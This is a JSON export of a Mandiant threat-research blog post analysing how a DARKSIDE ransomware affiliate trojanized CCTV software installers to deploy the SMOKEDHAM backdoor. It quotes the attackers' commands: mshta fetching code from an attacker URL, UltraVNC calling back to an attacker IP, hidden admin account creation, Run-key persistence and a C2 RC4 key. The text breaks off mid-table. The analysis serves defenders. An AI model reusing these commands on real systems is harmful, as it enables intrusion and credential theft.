{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "admin",
  "jcr:created": "Wed Jun 16 2021 15:52:43 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "admin",
    "jcr:title": "Smoking Out a DARKSIDE Affiliate\u2019s Supply Chain Software Compromise",
    "jcr:versionHistory": "45a0b5ed-44a9-44ef-9f43-20260351f40b",
    "author": "Tyler McLellan",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "c973de76-160f-4546-b243-7ccdd0e34511"
    ],
    "jcr:created": "Thu Jun 17 2021 15:36:20 GMT+0000",
    "cq:lastModified": "Thu Jun 17 2021 15:36:14 GMT+0000",
    "jcr:baseVersion": "c973de76-160f-4546-b243-7ccdd0e34511",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:tyler-mclellan",
      "fireeye-blog-authors:robert-dean",
      "fireeye-blog-authors:justin-moore",
      "fireeye-blog-authors:cap-nick-harbour",
      "fireeye-blog-authors:mike-hunhoff",
      "fireeye-blog-authors:jared-wilson",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:ransomware",
      "fireeye-blog-tags:unc",
      "fireeye-blog-tags:supply-chain",
      "fireeye-blog-authors:cap-jordan-nuce"
    ],
    "jcr:uuid": "44ba146b-c03e-4975-b8de-9fdbae1fea5c",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Wed Jun 16 2021 12:00:00 GMT-0400",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003EMandiant observed DARKSIDE affiliate UNC2465 accessing at least one victim through a Trojanized software installer downloaded from a legitimate website. While this victim organization detected the intrusion, engaged Mandiant for incident response, and avoided ransomware, others may be at risk.\u003C\/p\u003E\n\u003Cp\u003EAs reported in the Mandiant post, \u0026quot;\u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2021\/05\/shining-a-light-on-darkside-ransomware-operations.html\u0022\u003EShining a Light on DARKSIDE Ransomware Operations\u003C\/a\u003E,\u0026quot; Mandiant Consulting has investigated intrusions involving several DARKSIDE affiliates. UNC2465 is one of those DARKSIDE affiliates that Mandiant believes has been active since at least March 2020.\u003C\/p\u003E\n\u003Cp\u003EThe intrusion that is detailed in this post began on May 18, 2021, which occurred days after the publicly reported shutdown of the overall DARKSIDE program (\u003Ca href=\u0022https:\/\/advantage.mandiant.com\/reports\/21-00010945\u0022\u003EMandiant Advantage background\u003C\/a\u003E). While no ransomware was observed here, Mandiant believes that affiliate groups that have conducted DARKSIDE intrusions may use multiple ransomware affiliate programs and can switch between them at will.\u003C\/p\u003E\n\u003Cp\u003ESometime in May 2021 or earlier, UNC2465 likely Trojanized two software install packages on a CCTV security camera provider website. Mandiant determined the installers were malicious in early June and notified the CCTV company of a potential website compromise, which may have allowed UNC2465 to replace legitimate downloads with the Trojanized ones.\u003C\/p\u003E\n\u003Cp\u003EWhile Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness. Software supply chain attacks can vary greatly in sophistication, from the recent FireEye-discovered \u003Ca adhocenable=\u0022false\u0022 href=\u0022\/content\/fireeye-www\/en_US\/blog\/threat-research\/2020\/12\/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\u0022\u003ESolarWinds attacks\u003C\/a\u003E to attacks such as this targeting smaller providers. A software supply chain attack allows a single intrusion to obtain the benefit of access to all of the organizations that run that victim company\u2019s software; in this case, an installer, rather than the software itself, was modified by UNC2465.\u003C\/p\u003E\n\u003Ch4\u003EDARKSIDE RaaS\u003C\/h4\u003E\n\u003Cp\u003EIn mid-May 2021, Mandiant observed multiple threat actors cite an announcement that appeared to be shared with\u0026nbsp;DARKSIDE RaaS affiliates by the operators of the service. This announcement stated that they lost access to their infrastructure, including their blog, payment, and content distribution network (CDN) servers, and would be closing their service. The post cited law enforcement pressure and pressure from the United States for this decision.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EMultiple users on underground forums have since come forward claiming to be unpaid\u0026nbsp;DARKSIDE affiliates, and in some cases privately provided evidence to forum administrators who confirmed that their claims were legitimate. There are some actors who have speculated that the\u0026nbsp;DARKSIDE operator\u2019s decision to close could be an exit scam. While we have not seen evidence suggesting that the operators of the\u0026nbsp;DARKSIDE service have resumed operations, we anticipate that at least some of the former affiliates of the\u0026nbsp;DARKSIDE service will likely identify different ransomware or malware offerings to use within their own operations.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003ENotably, Mandiant has continued to observe a steady increase in the number of publicly named victims on ransomware shaming sites within the past month. Despite the recent ban of ransomware-related posts within underground forums, threat actors can still leverage private chats and connections to identify ransomware services. As one example, in mid-May 2021, the operator of the SODINOKIBI (aka\u0026nbsp;REvil) RaaS indicated that multiple affiliates from other RaaS platforms that had shut down were switching to their service. Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future.\u003C\/p\u003E\n\u003Ch4\u003EBackground\u003C\/h4\u003E\n\u003Cp\u003EIn June 2021, Mandiant Consulting was engaged to respond to an intrusion. During analysis, Mandiant determined the initial vector was a trojanized security camera PVR installer from a legitimate website. Mandiant attributed the overall intrusion activity to DARKSIDE affiliate UNC2465 due to continued use of infrastructure and tooling since October 2020.\u003C\/p\u003E\n\u003Cp\u003EOn May 18, 2021, a user in the affected organization browsed to the Trojanized link and downloaded the ZIP. Upon installing the software, a chain of downloads and scripts were executed, leading to SMOKEDHAM and later NGROK on the victim\u2019s computer. Additional malware use such as BEACON, and lateral movement also occurred. Mandiant believes the Trojanized software was available from May 18, 2021, through June 8, 2021.\u003C\/p\u003E\n\u003Cp\u003EPivoting on the slightly modified, but benign, MSHTA.exe application in VirusTotal, Mandiant identified a second installer package with the MD5 hash, e9ed774517e129a170cdb856bd13e7e8 (SVStation_Win64-B1130.1.0.0.exe), from May 26, 2021, which also connects out the same URL as the Trojanized SmartPSS installer.\u003C\/p\u003E\n\u003Ch4\u003ESupply Chain Intrusion Cycle\u003C\/h4\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig1.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 1: Intrusion cycle\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EPhase 1: Trojanized Installer Download\u003C\/h4\u003E\n\u003Cp\u003EMandiant Consulting observed the Trojanized installer downloaded on a Windows workstation after the user visited a legitimate site that the victim organization had used before.\u003C\/p\u003E\n\u003Cp\u003EThe downloaded file was extracted to\u003Cbr\u003E\nC:\\Users\\[username]\\Downloads\\06212019-General-SMARTPSS-Win32-ChnEng-IS\\General_SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023\\SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General-v1.exe.\u003C\/p\u003E\n\u003Cp\u003EMandiant confirmed the user intended to download, install, and use the SmartPSS software. Figure 2 shows an image of the download page used for SmartPSS software.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: SmartPSS download page\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EPhase 2: Nullsoft Installer\u003C\/h4\u003E\n\u003Cp\u003EThe installer executable is a Nullsoft installer that when executed wrote two files to C:\\ProgramData\\SMARTPSS-Win32_ChnEng_IS. We were able to extract the malicious installer script and files for analysis using 7-Zip. The relevant section of this installer script is shown below in Figure 3.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig3.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: Nullsoft installer script section\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe installer script created two files: SMARTPSS-Win32_ChnEng_IS_V2.002.0000007.0.R.181023-General.exe (b540b8a341c20dced4bad4e568b4cbf9) and smartpss.exe (c180f493ce2e609c92f4a66de9f02ed6). The former is a clean installer from the original developer and is launched first, installing the software as the user may expect. The latter is launched with a command line URL executing the content.\u003C\/p\u003E\n\u003Cp\u003EThe smartpss.exe file contained metadata describing itself as MSHTA.exe from Microsoft, a legitimate operating system component, but the MD5 hash was unknown. Disassembly analysis of the program showed it was a small application that loaded the IE COM object and launched the function RunHTMLApplication() against the command line argument provided. This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy. Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: CyberChef diff between MSHTA.exe and smartpss.exe\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EPhase 3: Downloaded VBScript and PowerShell\u003C\/h4\u003E\n\u003Cp\u003EUpon execution, the modified Mshta file was executed with the URL, hxxp:\/\/sdoc[.]xyz\/ID-508260156241, and passed as an argument on the command line.\u003C\/p\u003E\n\u003Cp\u003EDomain sdoc[.]xyz was first associated with UNC2465 by \u003Ca href=\u0022https:\/\/staging.community.riskiq.com\/article\/fdf74f23\u0022\u003ERiskIQ\u003C\/a\u003E in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported. According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EC:\\PROGRAMDATA\\SMARTPSS-Win32_ChnEng_IS\\smartpss.exe hxxp:\/\/sdoc[.]xyz\/ID-508260156241\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory. Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;..\u0026lt;script language=\u0027VBScript\u0027\u0026gt;..On Error Resume Next\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EAt the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code. It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant. A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig5.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EShortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig6.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: SMOKEDHAM downloader\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EWithin seconds, a file named qnxfhfim.cmdline was written to disk and executed using the Command-Line Compiler.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ecsc.exe \/noconfig \/fullpaths @\u0027C:\\Users\\ [username]\\AppData\\Local\\Temp\\qnxfhfim\\qnxfhfim.cmdline\u0027\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EMandiant was not able to recover this file at the time of writing; however, Mandiant was able to recover partial contents of the file.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E...\/t:library \/utf8output \/R:\u0027System.dll\u0027 \/R:\u0027C:\\windows\\Microso\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EAfter the execution of qnxfhfim.cmdline, PowerShell initiated the first connection to the fronted domain lumiahelptipsmscdnqa[.]microsoft[.]com used by SMOKEDHAM.\u003C\/p\u003E\n\u003Ch4\u003EPhase 4: SMOKEDHAM Dropper\u003C\/h4\u003E\n\u003Cp\u003EThe SMOKEDHAM dropper (f075c2894ac84df4805e8ccf6491a4f4) is written in PowerShell and decrypts and executes in memory the SMOKEDHAM backdoor. The dropper uses the Add-Type cmdlet to define a new .NET class for the backdoor. The Add-Type cmdlet can be used to define a new .NET class using an existing assembly or source code files or specifying source code inline or saved in a variable. In this case, the dropper uses SMOKEDHAM backdoor source code that is stored in a variable.\u003C\/p\u003E\n\u003Cp\u003EThe SMOKEDHAM backdoor source code is embedded as an encrypted string. The dropper uses the ConvertTo-SecureString cmdlet and an embedded key to decrypt the source code prior to executing the Add-Type cmdlet. After defining a new .NET class for the backdoor, the dropper executes the backdoor\u0027s entry point. The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval. Figure 7 shows the deobfuscated SMOKEDHAM dropper.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig7.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: SMOKEDHAM dropper\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EPhase 5: SMOKEDHAM Backdoor\u003C\/h4\u003E\n\u003Cp\u003ESMOKEDHAM (127bf1d43313736c52172f8dc6513f56) is a .NET-based backdoor that supports commands, including screen capture and keystroke capture. The backdoor may also download and execute additional PowerShell commands from its command and control (C2) server.\u003C\/p\u003E\n\u003Ch5\u003ESMOKEDHAM Network Communications\u003C\/h5\u003E\n\u003Cp\u003ESMOKEDHAM communicates with its C2 server using HTTPS. The backdoor uses domain fronting to obfuscate its true C2 server. The fronted domain is configured by an earlier stage of execution and the actual domain is hard-coded in the backdoor. Mandiant observed the fronted domain lumiahelptipsmscdnqa.microsoft[.]com and hard-coded domain max-ghoster1.azureedge[.]net used for C2 server communication.\u003C\/p\u003E\n\u003Cp\u003EThe communication between SMOKEDHAM and its C2 server consists of JSON data exchanged via HTTP POST requests. The backdoor initiates requests to the C2 server and the C2 server may include commands to execute in the responses. The JSON data exchanged between SMOKEDHAM and its C2 server contains three fields: ID, UUID, and Data.\u003C\/p\u003E\n\u003Cp\u003EThe ID field contains a unique value generated by the backdoor for the target system.\u003C\/p\u003E\n\u003Cp\u003EThe UUID field may contain a unique value used to track command output or be empty. When the C2 server responds with a command to execute, it sets the UUID field to a unique value. SMOKEDHAM then sets the same UUID value in the subsequent HTTP POST request that contains the command output.\u003C\/p\u003E\n\u003Cp\u003EThe Data field may contain RC4-encrypted, Base64-encoded command data or be empty. The backdoor uses the Data field to send command output to its C2 server. The C2 server uses the Data field to send commands to the backdoor to execute. The backdoor uses an RC4 key configured by an earlier stage of execution to encrypt and decrypt the Data field. Mandiant observed the RC4 key \u003Ci\u003EUwOdHsFXjdCOIrjTCfnblwEZ\u003C\/i\u003E used for RC4 encryption and decryption.\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Ch5\u003ESMOKEDHAM Commands\u003C\/h5\u003E\n\u003Cp\u003ESMOKEDHAM Base64-decodes, and RC4-decrypts command data returned in the Data field. The backdoor checks if the plaintext command data begins with one of the following keywords, shown in Table 1.\u003C\/p\u003E\n\u003Ctable border=\u00221\u0022 cellspacing=\u00220\u0022 cellpadding=\u00220\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022121\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EKeyword\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022528\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E\u003Cb\u003EAction\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022121\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Edelay\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022528\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EUpdate its sleep interval\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022121\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Escreenshot\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022528\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003EUpload a screen capture to its C2 server via a subsequent HTTP POST request\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022121\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003Eexit\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022528\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003ETerminate\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003ETable 1: Plaintext command data keywords\u003Cbr\u003E\n \u003C\/span\u003E\u003Cbr\u003E\nIf the plaintext command data does not begin with any of the keywords listed in Table 1, then SMOKEDHAM assumes the data contains a PowerShell command and attempts to execute it. The backdoor uploads output generated by the PowerShell command to its C2 server via a subsequent HTTP POST request.\u003C\/p\u003E\n\u003Cp\u003EIn addition to supporting the commands in Table 1, SMOKEDHAM continuously captures keystrokes. The backdoor writes captured keystrokes to memory and uploads them to its C2 server every five seconds via HTTP POST requests.\u003C\/p\u003E\n\u003Ch5\u003ESMOKEDHAM In Action\u003C\/h5\u003E\n\u003Cp\u003ESMOKEDHAM was observed executing commands on the target system using PowerShell.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EThe following commands were used to collect information about the system and logged in users.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Enet.exe user\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Enet.exe users\u003Cbr\u003E\n \u003Cbr\u003E\n whoami.exe\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ewhoami.exe \/priv\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Esysteminfo.exe\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe following commands were used to create and add the DefaultUser account to the local Administrators group, and subsequently hide the account from the Windows logon screen.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Enet.exe user DefaultUser REDACTED \/ADD\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Enet.exe localgroup Administrators DefaultUser \/ADD\u0026nbsp;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereg.exe ADD \u0027HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\u0027 \/v DefaultUser \/t REG_DWORD \/d 0 \/f\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe following commands facilitated lateral movement by modifying Terminal Server registry key values to enable multiple Remote Desktop connection sessions, and modifying the Local Security Authority (LSA) registry key value to require a password for authentication.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereg.exe ADD \u0027HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0027 \/v fDenyTSConnections \/t REG_DWORD \/d 0 \/f\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereg.exe ADD \u0027HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0027 \/v fSingleSessionPerUser \/t REG_DWORD \/d 0 \/f\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa \/v LimitBlankPasswordUse \/t REG_DWORD \/d 1 \/f\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EAdditionally, SMOKEDHAM modified the WDigest registry key value HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential to enable credential caching.\u003C\/p\u003E\n\u003Ch4\u003EPhase 6: Follow-on Activity\u003C\/h4\u003E\n\u003Cp\u003ESMOKEDHAM used PowerShell to connect to third-party file sharing sites to download the UltraVNC application renamed as winvnc.exe, and a configuration file named UltraVNC.ini, shown in Figure 8. These files were saved to the %APPDATA%\\Chrome\\ directory. The UltraVNC.ini file allowed UltraVNC to connect to port 6300 on the loopback address specified by the parameter AllowLoopback=1.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig8.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Contents of UltraVNC.ini\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ESMOKEDHAM was observed using UltraVNC to establish a connection to the IP address and port pair 81.91.177[.]54[:]7234 that has been observed in past UNC2465 intrusions.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E%APPDATA%\\Chrome\\winvnc.exe\u0027 -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 \u2013run\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ESMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \/v ConhostNT \/d %appdata%\\Chrome\\winvnc.exe\u003Cbr\u003E\n\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003ENGROK Configuration\u003C\/h4\u003E\n\u003Cp\u003ESMOKEDHAM used PowerShell to connect to third-party file sharing sites to download an NGROK utility that was renamed conhost.exe, and a script named VirtualHost.vbs that was used to execute NGROK with a configuration file named ngrok.yml. These files were stored in the C:\\ProgramData\\WindNT\\ directory. NGROK is a publicly available utility that can expose local servers behind NATs and firewalls to the public internet over secure tunnels.\u003C\/p\u003E\n\u003Cp\u003EFigure 9 and Figure 10 show the contents of VirtualHost.vbs and ngrok.yml files, respectively.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig9.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: Contents of VirtualHost.vbs\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/darkside-supply-chain\/fig10.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 10: Contents of ngrok.yml\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe execution of VirtualHost.vbs allowed NGROK to listen and forward traffic on TCP port 6300 through an NGROK tunnel, subsequently allowing NGROK to tunnel UltraVNC traffic out of the environment.\u003C\/p\u003E\n\u003Cp\u003ESMOKEDHAM created a persistence mechanism for NGROK by adding VirtualHost.vbs to the WindNT value under the current users Run registry key.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Ereg.exe add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run \/v WindNT \/d C:\\ProgramData\\WindNT\\VirtualHost.vbs\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003EKeylogger Deployment\u003C\/h4\u003E\n\u003Cp\u003EThis attacker utilized an additional keylogging utility named C:\\ProgramData\\psh\\console.exe. The keylogging utility was configured to capture and record keystrokes to C:\\ProgramData\\psh\\System32Log.txt.\u003C\/p\u003E\n\u003Cp\u003EMandiant then observed the attacker use UltraVNC to download two LNK files that reference the keylogging utility. The downloaded files were named desktop.lnk and console.lnk, respectively, and were placed in the following persistence locations:\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003EC:\\Users\\[username]\\Start Menu\\Programs\\Startup\\desktop.lnk\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\desktop.lnk\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\console.lnk\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Ch4\u003ECobalt Strike Beacon\u003C\/h4\u003E\n\u003Cp\u003EThe attacker used UltraVNC to download an in-memory dropper for Cobalt Strike to C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe. Update.exe was a Go based dropper created using the \u003Ca href=\u0022https:\/\/github.com\/optiv\/ScareCrow\u0022\u003EScareCrow\u003C\/a\u003E framework. The attacker executed C:\\ProgramData\\Cisco Systems\\Cisco Jabber\\update.exe using Command Prompt.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 